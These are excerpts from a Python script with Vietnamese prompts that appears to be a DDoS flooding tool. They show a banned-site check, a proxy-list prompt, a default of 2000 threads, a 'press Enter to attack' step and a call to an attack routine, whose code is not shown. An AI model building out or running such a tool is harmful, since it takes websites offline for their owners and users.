...
       print("\n[X] ERROR: Trang WEB Đang Ở Trong Danh Sách Cấm")
       sleep(4)
       url      = ""
       url_main = ""
       start_url()
...
    choice4 = input("[?] Nhận Một List Mới " +str(filenam2)+ " [Y/N]: ")
...
    except ValueError:
        threads = int(2000)
        print ("[!] Chọn Threads " +str(threads)+ " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('=*= Ấn "Enter" Để Tấn Công ')
    if choice6 == "":
...
            print("[+] Admin: Hãy Chú Ý Đến Trang Web Mà Bạn DDoS")
            sleep(5)
        attack()
        print()
    else:
